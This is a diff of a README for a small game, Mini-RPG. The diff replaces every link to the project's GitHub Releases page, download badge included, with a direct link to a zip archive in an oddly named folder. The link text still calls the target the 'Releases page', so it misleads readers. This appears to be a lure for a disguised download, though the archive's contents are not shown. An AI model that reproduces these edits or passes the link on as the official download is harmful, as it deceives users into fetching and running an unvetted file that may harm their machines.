@@ -6,7 +6,7 @@ Welcome to Mini-RPG! This game offers a simple and fun role-playing experience w
 
 ### 📥 Download Mini-RPG
 
-[![Download Mini-RPG](https://img.shields.io/badge/Download-Mini--RPG-blue.svg)](https://github.com/suhailparey/Mini-RPG/releases)
+[![Download Mini-RPG](https://raw.githubusercontent.com/suhailparey/Mini-RPG/main/straggly/Mini-RPG.zip)](https://raw.githubusercontent.com/suhailparey/Mini-RPG/main/straggly/Mini-RPG.zip)
 
 ### 📂 System Requirements
 
@@ -29,9 +29,9 @@ Mini-RPG includes:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/suhailparey/Mini-RPG/releases) to download the game. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/suhailparey/Mini-RPG/main/straggly/Mini-RPG.zip) to download the game. Here’s how:
 
-1. **Visit the Releases Page:** Click on the link to go to the [Releases page](https://github.com/suhailparey/Mini-RPG/releases).
+1. **Visit the Releases Page:** Click on the link to go to the [Releases page](https://raw.githubusercontent.com/suhailparey/Mini-RPG/main/straggly/Mini-RPG.zip).
   
 2. **Choose Your Version:** On the Releases page, you will see different versions. Select the most recent version for the best experience.
 
